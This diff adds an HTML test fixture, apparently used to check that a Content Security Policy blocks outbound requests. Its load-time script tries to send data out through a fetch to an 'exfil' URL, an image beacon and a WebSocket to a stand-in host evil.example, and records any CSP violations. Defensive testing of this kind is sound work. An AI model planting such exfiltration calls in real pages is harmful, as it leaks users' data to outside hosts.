@@ -1,0 +1,17 @@
+<!doctype html><meta charset="utf-8">
+<pre id="v">no-violation</pre>
+<script>
+  // A hostile artifact: try to exfiltrate via fetch and via an image beacon.
+  // If CSP is enforced, the browser fires securitypolicyviolation and neither
+  // request leaves. This fires ONLY on a real CSP block (not a network error).
+  const seen = [];
+  document.addEventListener("securitypolicyviolation", (e) => {
+    seen.push(e.violatedDirective);
+    document.getElementById("v").textContent = "CSP_BLOCKED:" + seen.join(",");
+  });
+  window.addEventListener("load", () => {
+    try { fetch("https://example.com/exfil?data=secret").catch(() => {}); } catch (e) {}
+    try { new Image().src = "https://evil.example/pixel?d=1"; } catch (e) {}
+    try { const ws = new WebSocket("wss://evil.example/x"); } catch (e) {}
+  });
+</script>
